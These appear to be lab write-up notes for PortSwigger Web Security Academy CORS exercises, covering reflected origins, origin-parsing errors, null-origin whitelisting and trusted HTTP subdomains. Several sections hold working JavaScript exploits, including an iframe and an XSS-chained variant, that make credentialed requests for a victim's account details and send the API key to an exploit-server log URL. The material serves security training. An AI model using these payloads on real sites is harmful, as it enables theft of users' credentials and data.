## **CORS vulnerability with basic origin reflection**

- Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
- Send the request to Burp Repeater, and resubmit it with the added header: Origin: [https://example.com](https://example.com/)

![Untitled](https://github.com/Lzmog/portswigger-labs/blob/main/images/cors/cors-1.png)

- Observe that the origin is reflected in the Access-Control-Allow-Origin header.
- In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL:

```jsx
<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get’,’https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
	req.withCredentials = true;
	req.send();

	function reqListener() {
		location='/log?key='+this.responseText;
	};
</script>
```

- Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
- Go back to the exploit server and click **Deliver exploit to victim**.
- Click **Access log**, retrieve and submit the victim's API key to complete the lab.

![Untitled](https://github.com/Lzmog/portswigger-labs/blob/main/images/cors/cors-2.png)

## **Errors parsing Origin headers**

*Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence).*

*For example, suppose an application grants access to all domains ending in:*

*normal-website.com*

*An attacker might be able to gain access by registering the domain:*

*hackersnormal-website.com*

*Alternatively, suppose an application grants access to all domains beginning with*

*normal-website.com*

*An attacker might be able to gain access using the domain:*

*[normal-website.com.evil-user.net](http://normal-website.com.evil-user.net/)*

## **Whitelisted null origin value**

```jsx
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://0aca00c103f782c0c0fc4040003c00e2.web-security-academy.net/accountDetails',true);
	req.withCredentials = true;
	req.send();

	function reqListener() {
		location='https://exploit-0a8200de03bc82e0c0633ff701a100f1.exploit-server.net/log?key='+this.responseText;
	};
</script>"></iframe>
```

![Untitled](https://github.com/Lzmog/portswigger-labs/blob/main/images/cors/cors-3.png)

![Untitled](https://github.com/Lzmog/portswigger-labs/blob/main/images/cors/cors-4.png)

## **Breaking TLS with poorly configured CORS - CORS vulnerability with trusted insecure protocols**

*Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:*

*GET /api/requestApiKey HTTP/1.1*

*Host: vulnerable-website.com*

*Origin: http://trusted-subdomain.vulnerable-website.com*

*Cookie: sessionid=...*

*The application responds with:*

*HTTP/1.1 200 OK*

*Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com*

*Access-Control-Allow-Credentials: true*

In Body:

```jsx
<script>

document.location="http://stock.0acc00d203b2cf08c183c137007400f2.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0acc00d203b2cf08c183c137007400f2.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a4f00fb0306cf99c157c0a8019f0025.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"

</script>
```

## **Intranets and CORS without credentials - CORS vulnerability with internal network pivot attack**

TBA